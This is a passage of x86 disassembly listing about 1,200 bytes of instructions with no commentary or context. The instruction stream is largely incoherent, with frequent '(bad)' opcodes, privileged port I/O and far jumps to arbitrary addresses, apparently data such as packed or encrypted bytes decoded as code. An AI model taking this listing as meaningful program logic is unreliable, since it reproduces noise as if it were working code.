  4091ed:	in     eax,dx
  4091ee:	fs mov dh,0x8c
  4091f1:	fsubr  QWORD PTR [ebx+0x5c]
  4091f4:	pop    edi
  4091f6:	xchg   BYTE PTR [edx+ebx*8-0x1605fa03],cl
  4091fd:	outs   dx,DWORD PTR ds:[esi]
  4091fe:	xlat   BYTE PTR ds:[ebx]
  4091ff:	mov    BYTE PTR [edx-0x346822de],0x9b
  409206:	shl    ecx,cl
  409208:	cmp    eax,0xbc2879dc
  40920d:	repnz sbb eax,0x59be64dd
  409213:	lods   al,BYTE PTR ds:[esi]
  409214:	test   al,0x7b
  409216:	jne    0x409246
  409218:	push   edx
  409219:	xchg   ebp,eax
  40921a:	rcr    dl,0x53
  40921d:	sbb    BYTE PTR [esi],bl
  40921f:	sub    DWORD PTR [eax],ecx
  409221:	xlat   BYTE PTR ds:[ebx]
  409222:	div    BYTE PTR [ebp-0x5e]
  409225:	es das 
  409227:	addr16 ja 0x40921f
  40922a:	sbb    al,0x6
  40922c:	mov    WORD PTR [ebp+0x72a79984],fs
  409232:	or     DWORD PTR [ecx-0x39],esi
  409235:	shl    BYTE PTR [ecx],0xb9
  409238:	int    0x4d
  40923a:	mov    dh,BYTE PTR [edx+0x6f125a29]
  409240:	and    eax,0x51db508e
  409245:	push   eax
  409246:	dec    esi
  409247:	call   0x5eb5:0xc1b5c8b9
  40924e:	mov    ecx,0xa5a0299c
  409253:	ins    BYTE PTR es:[edi],dx
  409254:	sub    al,0x65
  409256:	mov    ch,0xaa
  409258:	ret    0xc4e3
  40925b:	adc    BYTE PTR [ecx],bl
  40925d:	and    eax,DWORD PTR [ebx]
  40925f:	neg    BYTE PTR [eax+0x7292e234]
  409265:	stos   BYTE PTR es:[edi],al
  409266:	xor    BYTE PTR [edx],0xa3
  409269:	jge    0x409243
  40926b:	nop
  40926c:	js     0x40927c
  40926e:	jo     0x4092ee
  409270:	int3   
  409271:	or     al,0x0
  409273:	cmc    
  409274:	pop    eax
  409275:	fldcw  WORD PTR [eax-0xa]
  409278:	cld    
  409279:	inc    ebp
  40927a:	jne    0x409261
  40927c:	pusha  
  40927d:	fistp  WORD PTR [ecx-0x33]
  409280:	xor    BYTE PTR [esi],ah
  409282:	sbb    ebx,DWORD PTR [esi]
  409284:	popa   
  409285:	fdiv   QWORD PTR [ebx+ecx*8-0x7287dd7f]
  40928c:	push   ebx
  40928d:	mov    al,ds:0x2f713aec
  409292:	loope  0x40926b
  409294:	jl     0x409249
  409296:	pop    esp
  409297:	mov    edx,0x4f17676a
  40929c:	jo     0x40924a
  40929e:	and    DWORD PTR [edi],edi
  4092a0:	or     ecx,DWORD PTR [eax-0x1b364222]
  4092a6:	add    eax,0x846828c5
  4092ab:	mov    ?,WORD PTR [eax-0x3]
  4092ae:	jmp    0x409256
  4092b0:	xchg   DWORD PTR [eax-0x16],esp
  4092b3:	push   ebp
  4092b4:	mov    cl,0xc4
  4092b6:	jne    0x409314
  4092b8:	and    cl,BYTE PTR [edi+0x2e]
  4092bb:	mov    ah,0xdb
  4092bd:	call   0xd0a1:0xf38cb1ab
  4092c4:	fsubr  st(5),st
  4092c6:	dec    ebx
  4092c7:	or     al,0x76
  4092c9:	repnz (bad) 
  4092cb:	(bad)  
  4092cc:	mov    bl,0xd4
  4092ce:	stc    
  4092cf:	mov    ch,BYTE PTR [ebx+0x8]
  4092d2:	mov    edx,eax
  4092d4:	mov    DWORD PTR [eax],ebx
  4092d6:	js     0x40932d
  4092d8:	aad    0xa9
  4092da:	sub    eax,0x26f52b78
  4092df:	cli    
  4092e0:	jmp    0xad764c6d
  4092e5:	sbb    ebx,DWORD PTR [edi-0x32]
  4092e8:	bound  ecx,QWORD PTR [ebp+esi*2-0x59]
  4092ec:	jbe    0x409273
  4092ee:	mov    edi,0xc6e7ed44
  4092f3:	outs   dx,DWORD PTR ds:[esi]
  4092f4:	sub    al,0xfe
  4092f6:	aaa    
  4092f7:	sbb    DWORD PTR [ecx-0x2b91945e],ebx
  4092fd:	or     eax,0xd1e56570
  409302:	dec    edx
  409303:	inc    edi
  409304:	mov    eax,0x61710e80
  409309:	(bad)  
  40930a:	jmp    0x13a215d7
  40930f:	(bad)  
  409311:	mov    ebx,DWORD PTR [esp+ecx*1+0x21]
  409315:	dec    edi
  409316:	mov    edx,0xb97e0edf
  40931b:	inc    esp
  40931c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40931d:	add    DWORD PTR [ebx],ebx
  40931f:	popf   
  409320:	retf   
  409321:	jg     0x4092d4
  409323:	imul   esp,DWORD PTR [ebp+0x791017be],0x64d64bbf
  40932d:	mov    al,ds:0x1055ab3
  409332:	sbb    esp,DWORD PTR [ecx-0x385d005e]
  409338:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409339:	mov    bl,BYTE PTR [ebx-0xe65c0e6]
  40933f:	data16 ins BYTE PTR es:[edi],dx
  409341:	dec    edx
  409342:	ret    
  409343:	shr    DWORD PTR [ebp-0x78],cl
  409346:	xchg   esp,eax
  409347:	ja     0x409343
  409349:	sub    ebx,DWORD PTR [esi+ebx*4-0x56dd875]
  409350:	(bad)  
  409351:	or     al,0x41
  409353:	lock xor bl,BYTE PTR [eax-0x68]
  409357:	(bad)  
  409358:	cmp    DWORD PTR ds:0xf17474a0,eax
  40935e:	jg     0x4093a5
  409360:	or     al,0x8d
  409362:	dec    esp
  409363:	(bad)  
  409364:	and    cl,BYTE PTR [eax+0x25]
  409367:	jno    0x40934d
  409369:	jae    0x4093ba
  40936b:	in     eax,dx
  40936c:	inc    ebp
  40936d:	xor    ebx,DWORD PTR [edi-0x5530cf94]
  409373:	lock xchg BYTE PTR [esi+0x5af73ccf],dl
  40937a:	daa    
  40937b:	aad    0x42
  40937d:	arpl   di,di
  40937f:	sbb    eax,DWORD PTR [ecx-0x52]
  409382:	sar    esp,0xfc
  409385:	inc    ebp
  409386:	repnz or bh,BYTE PTR [eax]
  409389:	pop    ss
  40938a:	lahf   
  40938b:	(bad)  
  40938c:	call   0x242533b
  409391:	mov    DWORD PTR [ecx+eiz*1+0xb],ebx
  409395:	xlat   BYTE PTR ds:[ebx]
  409396:	mov    esp,0x4f48ded8
  40939b:	test   DWORD PTR [ebp-0x5616c837],edx
  4093a1:	test   eax,0xe06c7fe2
  4093a6:	fidivr DWORD PTR [eax]
  4093a8:	je     0x409351
  4093aa:	cdq    
  4093ab:	or     al,0x9
  4093ad:	or     DWORD PTR [ebx+0xc],ecx
  4093b0:	xchg   BYTE PTR [ebx-0x62],bl
  4093b3:	sub    BYTE PTR [esi+0x47],0x39
  4093b7:	clc    
  4093b8:	push   0x76566db9
  4093bd:	mov    al,ds:0xfb1ecf59
  4093c2:	aam    0x36
  4093c4:	pop    ebx
  4093c5:	ror    DWORD PTR [ebx-0x1d],0xc9
  4093c9:	dec    eax
  4093ca:	add    ebx,ebp
  4093cc:	inc    edi
  4093cd:	lds    esp,FWORD PTR [ebp+0x431c4550]
  4093d3:	cli    
  4093d4:	(bad)  ds:0xc759600b
  4093da:	push   esi
  4093db:	jb     0x4093ae
  4093dd:	lds    edi,FWORD PTR [edx-0x4eef9e1a]
  4093e3:	es cld 
  4093e5:	and    eax,0x74f333ee
  4093ea:	(bad)  
  4093eb:	popa   
  4093ec:	cmc    
  4093ed:	in     al,dx
  4093ee:	ret    
  4093ef:	aam    0xb5
  4093f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4093f2:	adc    DWORD PTR [edi-0x76],0xffffffe4
  4093f6:	jo     0x409392
  4093f8:	aas    
  4093f9:	aad    0x32
  4093fb:	inc    ecx
  4093fc:	jnp    0x409397
  4093fe:	cmp    al,0xab
  409400:	or     ch,dh
  409402:	sar    BYTE PTR [eax],0x26
  409405:	ficomp DWORD PTR [esi-0x48c2a595]
  40940b:	jnp    0x4093ab
  40940d:	lahf   
  40940e:	push   ss
  40940f:	adc    BYTE PTR [ecx+0x7f349084],0x1d
  409416:	sbb    al,0x23
  409418:	ss dec edx
  40941a:	test   BYTE PTR [eax],ch
  40941c:	les    esi,FWORD PTR [esi+0x3d]
  40941f:	mov    ecx,0x42da3625
  409424:	lahf   
  409425:	stc    
  409426:	iret   
  409427:	jb     0x4093d3
  409429:	cs and eax,ebx
  40942c:	mov    ah,ah
  40942e:	aaa    
  40942f:	xor    ch,BYTE PTR [ebp+0x7e56873a]
  409435:	enter  0x8580,0x76
  409439:	into   
  40943a:	xchg   ebx,eax
  40943b:	mov    cl,bh
  40943d:	inc    esp
  40943e:	pop    edx
  40943f:	dec    BYTE PTR [eax-0x38]
  409442:	test   DWORD PTR [edx-0x5a179a32],ebx
  409448:	cmp    DWORD PTR [esi],0xf604e070
  40944e:	mov    edi,0xf6407675
  409453:	cmp    ch,al
  409455:	jl     0x4093fc
  409457:	xor    dh,BYTE PTR [esi+0x24]
  40945a:	jl     0x4093e6
  40945c:	pop    ds
  40945d:	xchg   edx,eax
  40945e:	test   BYTE PTR [edx-0x4b],0xac
  409462:	pop    ecx
  409463:	es fcmovnbe st,st(4)
  409466:	mov    dh,0x6b
  409468:	cmp    DWORD PTR [ebp-0x33],ebp
  40946b:	jbe    0x40949e
  40946d:	and    DWORD PTR [esi+0xf],esp
  409470:	std    
  409471:	and    edi,DWORD PTR [ebp+0x59]
  409474:	jecxz  0x40947b
  409476:	retf   
  409477:	test   BYTE PTR [ebp+0x482fb5b5],bl
  40947d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40947e:	pop    eax
  40947f:	ins    DWORD PTR es:[edi],dx
  409480:	sbb    DWORD PTR [ecx+0x4],ecx
  409483:	ins    DWORD PTR es:[edi],dx
  409484:	ret    0x314e
  409487:	dec    ebp
  409488:	or     BYTE PTR [ebx-0x6d8a86ee],dl
  40948e:	pop    ebx
  40948f:	mov    ch,0x44
  409491:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409492:	xor    ebp,esi
  409494:	out    0x59,al
  409496:	pop    ss
  409497:	cmp    eax,0xf197a6d7
  40949c:	ja     0x409423
  40949e:	outs   dx,BYTE PTR ds:[esi]
  40949f:	(bad)  
  4094a1:	lods   al,BYTE PTR ds:[esi]
  4094a2:	fcom   QWORD PTR [esi]
  4094a4:	cmp    BYTE PTR [ebp+0x3b],dl
  4094a7:	scas   al,BYTE PTR es:[edi]
  4094a8:	inc    ebp
  4094a9:	(bad)  
  4094aa:	mov    ds:0x95c07987,al
  4094af:	lds    ebx,FWORD PTR [ebx]
  4094b1:	xor    BYTE PTR [ecx+ecx*1-0x9],0x4a
  4094b6:	pop    esp
  4094b7:	clc    
  4094b8:	repnz test BYTE PTR [ebp-0x41],al
  4094bc:	push   ss
  4094bd:	imul   esp,DWORD PTR [esi],0x0
  4094c0:	shl    BYTE PTR [edi-0x6c],0x3b
  4094c4:	xlat   BYTE PTR ds:[ebx]
  4094c5:	daa    
  4094c6:	out    dx,al
  4094c7:	pop    eax
  4094c8:	inc    ebx
  4094c9:	ret    
  4094ca:	dec    ecx
  4094cb:	mov    dh,0x29
  4094cd:	(bad)  
  4094ce:	(bad)  
  4094cf:	out    0x69,eax
  4094d1:	adc    bl,BYTE PTR [edx+eiz*4]
  4094d4:	rol    DWORD PTR [edi],1
  4094d6:	mov    ecx,DWORD PTR [ecx+ebp*2+0x4c8cb2db]
  4094dd:	push   eax
  4094de:	jbe    0x40947d
  4094e0:	xor    DWORD PTR ds:0xb3b3e4f6,ebx
  4094e6:	push   esp
  4094e7:	cmp    ah,BYTE PTR [ecx+0x5d]
  4094ea:	push   eax
  4094eb:	jno    0x4094be
  4094ed:	sub    esp,DWORD PTR [esi+0x56031ac1]
  4094f3:	jmp    0x1b6185c1
  4094f8:	jl     0x40948f
  4094fa:	add    BYTE PTR [edi],bl
  4094fc:	jns    0x40952d
  4094fe:	cli    
  4094ff:	xor    ah,BYTE PTR [eax+0x10]
  409502:	dec    esi
  409503:	adc    ecx,DWORD PTR [esi+0x63]
  409506:	daa    
  409507:	imul   eax,DWORD PTR [edi],0x9f003125
  40950d:	jg     0x409570
  40950f:	add    eax,0xf971deaa
  409514:	cmp    ch,BYTE PTR [ebp+0x6]
  409517:	adc    eax,0x1ab0a7c5
  40951c:	mov    ebx,0x2638ee4a
  409521:	sahf   
  409522:	mov    edi,?
  409524:	cwde   
  409525:	adc    al,0xc4
  409527:	xor    ch,BYTE PTR [edi-0x404de563]
  40952d:	and    esi,esp
  40952f:	stos   BYTE PTR es:[edi],al
  409530:	mov    ebx,0xd42d62be
  409535:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409536:	jae    0x4094bd
  409538:	jp     0x409595
  40953a:	xchg   edx,eax
  40953b:	jno    0x409594
  40953d:	ins    BYTE PTR es:[edi],dx
  40953e:	push   esp
  40953f:	pop    edi
  409540:	sub    eax,0x28ebd7c3
  409545:	xor    bh,BYTE PTR [ebp-0x5f]
  409548:	imul   eax,esp,0xa183aff8
  40954e:	mov    ah,0xb7
  409550:	mov    eax,ds:0xa933fa7a
  409555:	sub    DWORD PTR [ecx],ebx
  409557:	addr16 mov esp,0xb3107dbd
  40955d:	arpl   WORD PTR [edx+0x743cc685],sp
  409563:	jnp    0x4095c9
  409565:	jecxz  0x40954f
  409567:	xchg   ebx,eax
  409568:	lods   al,BYTE PTR ds:[esi]
  409569:	push   eax
  40956a:	mov    edx,0x57f9552d
  40956f:	or     al,0xbc
  409571:	out    0xf3,eax
  409573:	lods   eax,DWORD PTR ds:[esi]
  409574:	mov    ebx,0xbc1770ca
  409579:	(bad)  
  40957a:	ja     0x409524
  40957c:	test   al,0xf8
  40957e:	enter  0xf167,0x9
  409582:	(bad)  
  409583:	nop
  409584:	stos   BYTE PTR es:[edi],al
  409585:	xchg   edi,eax
  409586:	xor    eax,0x438e2376
  40958b:	sbb    dh,bh
  40958d:	adc    eax,0x12306ebc
  409592:	inc    esi
  409593:	sub    BYTE PTR [esi],0x40
  409596:	sub    DWORD PTR [eax-0x17b2166d],esp
  40959c:	inc    eax
  40959d:	mov    edi,0xe0583a32
  4095a2:	cmp    al,BYTE PTR [edi+0x1eddc2e5]
  4095a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4095a9:	xchg   esi,eax
  4095aa:	and    DWORD PTR [ecx-0x63],ebx
  4095ad:	into   
  4095ae:	mov    edx,0xd6238307
  4095b3:	pushf  
  4095b4:	push   eax
  4095b5:	std    
  4095b6:	stos   BYTE PTR es:[edi],al
  4095b7:	out    dx,al
  4095b8:	jmp    0x9835:0x128ed76d
  4095bf:	adc    BYTE PTR [edx+edi*8+0x48],0xd6
  4095c4:	mov    ds:0xb2efa4fd,al
  4095c9:	inc    edx
  4095ca:	clc    
  4095cb:	fdivr  DWORD PTR [edx]
  4095cd:	mov    ecx,0x6a6b3255
  4095d2:	addr16 pop esi
  4095d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4095d5:	shl    DWORD PTR [edi],1
  4095d7:	aas    
  4095d8:	mov    WORD PTR [edx],ss
  4095da:	add    BYTE PTR [edx+0x37abd1f2],ah
  4095e0:	lds    ebp,FWORD PTR [ebp-0x7de9a60c]
  4095e6:	test   al,0x4
  4095e8:	call   ebp
  4095ea:	aad    0x7e
  4095ec:	adc    al,0xf
  4095ee:	bound  eax,QWORD PTR [edx-0x15]
  4095f1:	dec    eax
  4095f2:	push   edx
  4095f3:	fiadd  DWORD PTR [eax]
  4095f5:	sub    bh,dh
  4095f7:	ds je  0x4095dd
  4095fa:	inc    esp
  4095fb:	scas   al,BYTE PTR es:[edi]
  4095fc:	ret    
  4095fd:	mov    dl,0x70
  4095ff:	and    ecx,DWORD PTR [esp+ebx*2]
  409602:	lods   eax,DWORD PTR ds:[esi]
  409603:	add    DWORD PTR [ebx+0x5a],0xffffffc8
  409607:	or     al,BYTE PTR [edi]
  409609:	adc    eax,0xe8f89de5
  40960e:	xor    BYTE PTR [eax-0x43],ah
  409611:	lds    ebx,FWORD PTR [edx]
  409613:	scas   al,BYTE PTR es:[edi]
  409614:	and    BYTE PTR ds:0xf1905369,dl
  40961a:	mov    es,WORD PTR [ebx]
  40961c:	jmp    0x47f96209
  409621:	jae    0x409654
  409623:	fucomi st,st(1)
  409625:	in     al,0xb0
  409627:	daa    
  409628:	mov    ebx,0xb5a66954
  40962d:	push   ds
  40962e:	inc    ebp
  40962f:	and    BYTE PTR [ebx-0x13],dl
  409632:	dec    esi
  409633:	and    BYTE PTR [edx],bh
  409635:	int    0xd9
  409637:	xchg   edx,eax
  409638:	adc    eax,0x52784144
  40963d:	addr16 repnz std 
  409640:	cwde   
  409641:	xchg   edi,eax
  409642:	inc    esp
  409643:	mov    esi,0xfe372da
  409648:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409649:	mov    cx,0x61dd
  40964d:	or     edx,DWORD PTR [ebx]
  40964f:	mov    al,ds:0x23267b02
  409654:	icebp  
  409655:	push   ebx
  409656:	push   ebp
  409657:	jbe    0x40966d
  409659:	inc    ecx
  40965a:	sub    eax,0x868a5296
  40965f:	leave  
  409660:	lods   eax,DWORD PTR ds:[esi]
  409661:	add    BYTE PTR [edx+0x1e190457],0x2
  409668:	stc    
  409669:	div    ecx
  40966b:	pop    ebx
  40966c:	push   esi
  40966d:	cli    
  40966e:	aas    
  40966f:	jle    0x40960b
  409671:	adc    al,0xb1
  409673:	or     ebx,DWORD PTR [edi]
  409675:	stos   DWORD PTR es:[edi],eax
  409676:	push   ds
  409677:	pop    edi
  409678:	add    BYTE PTR [esp+ebx*1],bl
  40967b:	mov    ecx,0x994331c
  409680:	xchg   ebp,eax
  409681:	sub    bl,dh
  409683:	adc    DWORD PTR [eax-0x368cfef0],0xb554c457
  40968d:	sbb    esp,DWORD PTR [ebx]
  40968f:	pop    ebx
  409690:	pop    es
  409691:	dec    esi
  409692:	cwde   
  409693:	stos   BYTE PTR es:[edi],al
  409694:	lock sti 
  409696:	pop    esp
  409697:	mov    ds:0xab859132,eax
  40969c:	lea    ebp,[edx]
  40969e:	pop    edx
  40969f:	sbb    cl,BYTE PTR [ebx]
  4096a1:	dec    edi
  4096a2:	mov    dh,BYTE PTR [edi-0x3b91f1ca]
  4096a8:	adc    edx,DWORD PTR [esi]
  4096aa:	pop    eax
  4096ab:	adc    eax,0xd1dc64d9
  4096b0:	ror    dh,1
  4096b2:	add    ebx,DWORD PTR [ebp-0x174dea09]
  4096b8:	mov    ah,0xe4
  4096ba:	sti    
  4096bb:	dec    eax
  4096bc:	popa   
  4096bd:	push   esi
  4096be:	jl     0x4096b4
  4096c0:	pop    ebx
  4096c1:	pop    ebx
  4096c2:	les    ecx,FWORD PTR [esi+edi*2-0x7ceaf734]
  4096c9:	dec    esp
  4096ca:	es pop ss
  4096cc:	inc    ecx
  4096cd:	inc    ecx
  4096ce:	jmp    eax
  4096d0:	(bad)  
  4096d2:	sub    esi,DWORD PTR ds:0xe4a77dd7
  4096d8:	je     0x409745
  4096da:	sti    
  4096db:	mov    cl,0x58
  4096dd:	mov    ah,0xc0
  4096df:	das    
  4096e0:	test   BYTE PTR [ecx-0x6b],ch
  4096e3:	mov    es,WORD PTR [ebp+0x597a7950]
  4096e9:	mov    eax,ds:0x7bb0966
  4096ee:	adc    cl,dh
  4096f0:	push   esp
  4096f1:	pop    ebp
  4096f2:	jne    0x4096c3
  4096f4:	lods   al,BYTE PTR ds:[esi]
  4096f5:	(bad)  
  4096f6:	adc    DWORD PTR [eax-0x38],ecx
  4096f9:	xchg   ecx,eax
  4096fa:	mov    esi,esi
  4096fc:	cdq    
  4096fd:	es int 0x8d
  409700:	call   0xa7f2:0xd9165707
  409707:	adc    al,0xd4
  409709:	scas   eax,DWORD PTR es:[edi]
  40970a:	sahf   
  40970b:	sub    BYTE PTR [esi+edx*8],bh
  40970e:	xor    al,0xec
  409710:	and    ch,BYTE PTR [ecx-0x49]
  409713:	sbb    al,0x50
  409715:	cli    
  409716:	push   edx
  409717:	jbe    0x4096f9
  409719:	es jae 0x4096a2
  40971c:	loop   0x409768
  40971e:	lahf   
  40971f:	xchg   esi,eax
  409720:	pop    es
  409721:	jae    0x409744
  409723:	xchg   edi,eax
  409724:	pop    esi
  409725:	dec    ebp
  409726:	sbb    edx,DWORD PTR [ebp+ebp*8+0x2b999fd8]
  40972d:	outs   dx,BYTE PTR ds:[esi]
  40972e:	dec    eax
  40972f:	xchg   ecx,eax
  409730:	out    0x1,eax
  409732:	dec    edx
  409733:	dec    ecx
  409734:	rol    al,0x3c
  409737:	fcomp  DWORD PTR [eax-0x3bf3bb5e]
  40973d:	stos   DWORD PTR es:[edi],eax
  40973e:	retf   
  40973f:	xor    edx,ebp
  409741:	stos   DWORD PTR es:[edi],eax
  409742:	xor    ecx,DWORD PTR [ecx+0x79d1619e]
  409748:	sub    eax,DWORD PTR [esi]
  40974a:	inc    ebp
  40974b:	xor    DWORD PTR [esi+0x76],esi
  40974e:	or     eax,0x4f7a1eb7
  409753:	xchg   ebp,eax
  409754:	xor    esi,DWORD PTR [ebp+0x1f]
  409757:	es popa 
  409759:	jne    0x409792
  40975b:	dec    edi
  40975c:	mov    cl,0xdd
  40975e:	inc    edi
  40975f:	xor    BYTE PTR [esp+eax*2-0x5ce8cb68],al
  409766:	xchg   ebp,eax
  409767:	jp     0x40971a
  409769:	cdq    
  40976a:	mov    edx,0x4f73ca4
  40976f:	fsubr  st,st(5)
  409771:	mov    bh,0xcd
  409773:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409775:	jbe    0x4097ca
  409777:	inc    edi
  409778:	jg     0x409749
  40977a:	inc    ebx
  40977b:	nop
  40977c:	or     eax,0xe324c7d4
  409781:	adc    DWORD PTR [ebx-0x4c],0x7
  409785:	xchg   edx,eax
  409786:	lock jns 0x409716
  409789:	mov    bh,0xfe
  40978b:	stos   DWORD PTR es:[edi],eax
  40978c:	xor    eax,0xa2442c52
  409791:	das    
  409792:	inc    esp
  409793:	cli    
  409794:	jbe    0x4097be
  409796:	mov    eax,0xfe132c76
  40979b:	outs   dx,BYTE PTR ds:[esi]
  40979c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40979d:	sbb    BYTE PTR [edi-0x7a],bl
  4097a0:	jbe    0x4097c6
  4097a2:	clc    
  4097a3:	push   esp
  4097a4:	push   ebp
  4097a5:	push   esp
  4097a6:	xchg   ebx,eax
  4097a7:	jp     0xebdc288e
  4097ad:	jne    0x409755
  4097af:	mov    bh,BYTE PTR [esi+0x40]
  4097b2:	ret    
  4097b3:	sbb    ebp,DWORD PTR [ebx+ebp*8-0x708aeb51]
  4097ba:	dec    ebp
  4097bb:	nop
  4097bc:	mov    al,ds:0x213beaed
  4097c1:	pop    eax
  4097c2:	fucomip st,st(2)
  4097c4:	addr16 loopne 0x409776
  4097c7:	(bad)  
  4097c8:	arpl   WORD PTR [ebp-0x73],di
  4097cb:	lea    edi,[esi]
  4097cd:	adc    BYTE PTR [edi-0x35],dl
  4097d0:	jne    0x4097da
  4097d2:	loope  0x4097c9
  4097d4:	dec    eax
  4097d5:	mov    esp,0x16970f3a
  4097da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097db:	mov    DWORD PTR [ecx],ecx
  4097dd:	mov    edi,gs
  4097df:	pop    edx
  4097e0:	pop    edx
  4097e1:	ror    BYTE PTR [esi+0x2],cl
  4097e4:	ds xchg ebx,eax
  4097e6:	push   ss
  4097e7:	scas   eax,DWORD PTR es:[edi]
  4097e8:	fidiv  DWORD PTR [eax]
  4097ea:	call   FWORD PTR [ebp-0x751a8525]
  4097f0:	clc    
  4097f1:	mov    ah,0x9f
  4097f3:	pop    ds
  4097f4:	out    dx,al
  4097f5:	sar    DWORD PTR [esi+ebp*2-0x52],cl
  4097f9:	rcl    DWORD PTR gs:[eax],cl
  4097fc:	pop    ebx
  4097fd:	js     0x4097f7
  4097ff:	pop    ecx
  409800:	mov    WORD PTR [edi],fs
  409802:	cmp    cl,cl
  409804:	push   ds
  409805:	sbb    al,0xcc
  409807:	data16 mov bh,0xc7
  40980a:	lock adc al,0xd0
  40980d:	sub    dh,ah
  40980f:	cs inc edx
  409811:	das    
  409812:	xor    eax,0xffdfcaa3
  409817:	xor    edi,esi
  409819:	or     eax,0x95d2e692
  40981e:	aam    0xda
  409820:	xchg   ebp,eax
  409821:	(bad)  [ebx]
  409823:	add    al,BYTE PTR [ebx]
  409825:	adc    DWORD PTR [ebx-0x68],ebx
  409828:	and    DWORD PTR es:[ebp-0x16339928],ecx
  40982f:	(bad)  
  409830:	jbe    0x4097e8
  409832:	out    0xd4,eax
  409834:	int    0xdb
  409836:	sub    ebp,0x1f168e4
  40983c:	push   esi
  40983d:	mov    ds:0x302185c7,al
  409842:	aas    
  409843:	test   BYTE PTR [esp+eax*4+0x6aa5c3f6],bl
  40984a:	adc    edx,0x3b2cce0b
  409850:	lods   eax,DWORD PTR ds:[esi]
  409851:	call   0xf925a1d3
  409856:	mov    DWORD PTR [eax-0xd],ecx
  409859:	mov    esp,0x99b4f62f
  40985e:	pop    ss
  40985f:	lea    esp,ds:[ebx+0x342f46b0]
  409866:	xchg   ebx,eax
  409867:	jecxz  0x409881
  409869:	(bad)  
  40986b:	sar    BYTE PTR [eax+esi*8],0xcf
  40986f:	das    
  409870:	inc    ecx
  409871:	mov    esi,0xb2bf38cd
  409876:	out    dx,eax
  409877:	data16 or al,0x8d
  40987a:	mov    dh,0xe6
  40987c:	fnsave [ebx]
  40987e:	mov    al,ds:0x1e310592
  409883:	xchg   esp,eax
  409884:	es sar ah,1
  409887:	dec    ebx
  409888:	addr16 inc ebp
  40988a:	pop    edi
  40988b:	loopne 0x40984f
  40988d:	(bad)  
  40988e:	jb     0x4098bc
  409890:	loope  0x40987b
  409892:	pushf  
  409893:	xchg   esp,eax
  409894:	ins    DWORD PTR es:[edi],dx
  409895:	(bad)  
  409896:	cwde   
  409897:	or     ah,ah
  409899:	loopne 0x4098d6
  40989b:	push   esi
  40989c:	shr    DWORD PTR [ecx],1
  40989e:	xchg   esp,eax
  40989f:	hlt    
  4098a0:	mov    ds:0x82b3f8a3,al
  4098a5:	ins    BYTE PTR es:[edi],dx
  4098a6:	dec    esp
  4098a7:	ficomp DWORD PTR [edx]
  4098a9:	inc    esi
  4098aa:	(bad)  
  4098ab:	jmp    0x40988f
  4098ad:	int    0x46
  4098af:	cmp    ah,0xd8
  4098b2:	add    al,0x10
  4098b4:	mov    WORD PTR [edi-0x77],fs
  4098b7:	mov    dh,0x6
  4098b9:	loop   0x409907
  4098bb:	pop    edx
  4098bc:	mov    bl,BYTE PTR [edi]
  4098be:	clc    
  4098bf:	push   ecx
  4098c0:	test   eax,0x84946dab
  4098c5:	xchg   edx,eax
  4098c6:	and    ch,dh
  4098c8:	adc    cl,BYTE PTR [edx+0x3a7bfbf6]
  4098ce:	dec    ah
  4098d0:	aaa    
  4098d1:	pop    es
  4098d2:	jb     0x4098d1
  4098d4:	call   0xd32f:0xdd45e5f7
  4098db:	jno    0x4098b1
  4098dd:	sub    BYTE PTR [ebx-0xb],ch
  4098e0:	adc    esi,DWORD PTR [ebp-0x22]
  4098e3:	mov    esp,0x287440f8
  4098e8:	mov    bh,0x1
  4098ea:	lds    ebx,FWORD PTR [edi]
  4098ec:	mov    bh,0x50
  4098ee:	fmul   DWORD PTR [esi-0x7972c0ff]
  4098f4:	fnstcw WORD PTR [esi-0x39]
  4098f7:	(bad)  [edi]
  4098f9:	jnp    0x409968
  4098fb:	jmp    0xd9b51c79
  409900:	clc    
  409901:	push   ss
  409902:	out    dx,al
  409903:	dec    eax
  409904:	scas   al,BYTE PTR es:[edi]
  409905:	inc    ebp
  409906:	pop    es
  409907:	jne    0x409942
  409909:	jecxz  0x4098eb
  40990b:	jb     0x4098b9
  40990d:	outs   dx,DWORD PTR ds:[esi]
  40990e:	outs   dx,BYTE PTR ds:[esi]
  40990f:	and    DWORD PTR ds:0x9e502865,esp
  409915:	fistp  WORD PTR [edx]
  409917:	push   esp
  409918:	mov    bl,ah
  40991a:	dec    esi
  40991b:	shl    DWORD PTR [edi-0x450a1ff5],0x5d
  409922:	(bad)  
  409923:	sbb    ebx,DWORD PTR [edi]
  409925:	xchg   edx,eax
  409926:	enter  0x9d34,0x3a
  40992a:	dec    ecx
  40992b:	data16 sahf 
  40992d:	in     al,0x88
  40992f:	jnp    0x409935
  409931:	sub    eax,0x34c41f09
  409936:	jne    0x4098c1
  409938:	shl    BYTE PTR [edi],1
  40993a:	mov    ah,0x2d
  40993c:	fstp   DWORD PTR [ebp-0x20dce734]
  409942:	(bad)  
  409943:	cmp    ecx,DWORD PTR [ebx]
  409945:	xchg   BYTE PTR ds:0xfa69440f,dh
  40994b:	fbstp  TBYTE PTR [esi+0x25]
  40994e:	cli    
  40994f:	and    ah,BYTE PTR [ecx+edi*4-0x7ede6558]
  409956:	adc    bh,BYTE PTR [esi-0x5c]
  409959:	mov    DWORD PTR [ecx-0x1b],0xab9333b3
  409960:	enter  0x3acb,0x3
  409964:	xor    DWORD PTR [edx+0x13],ebp
  409967:	call   FWORD PTR [edi+ecx*4]
  40996a:	add    DWORD PTR [edi-0x7b9e1aeb],esp
  409970:	sub    BYTE PTR [ecx+0x7285eb45],0xaf
  409977:	outs   dx,DWORD PTR ds:[esi]
  409978:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409979:	repnz sub BYTE PTR [ebx-0x6b],dh
  40997d:	and    eax,0x1d022444
  409982:	aad    0x4a
  409984:	jmp    0x409977
  409986:	sub    edi,eax
  409988:	mov    DWORD PTR [eax+0x48152119],ebx
  40998e:	push   esi
  40998f:	xor    al,0x43
  409991:	mov    esp,0x9a9726d8
